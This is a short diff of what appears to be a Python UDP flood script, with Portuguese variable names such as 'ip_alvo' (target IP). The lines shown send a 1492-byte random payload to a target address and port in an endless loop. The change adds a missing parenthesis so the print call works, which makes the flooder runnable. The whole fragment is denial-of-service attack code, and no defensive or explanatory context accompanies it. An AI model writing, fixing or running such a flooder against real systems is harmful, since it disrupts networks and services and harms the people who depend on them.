@@ -14,4 +14,5 @@ bytes = random._urandom(1492)
 
 while True:
    d.sendto(bytes, (ip_alvo, conv_porta))
-   print(bytes
+   print(bytes)
+
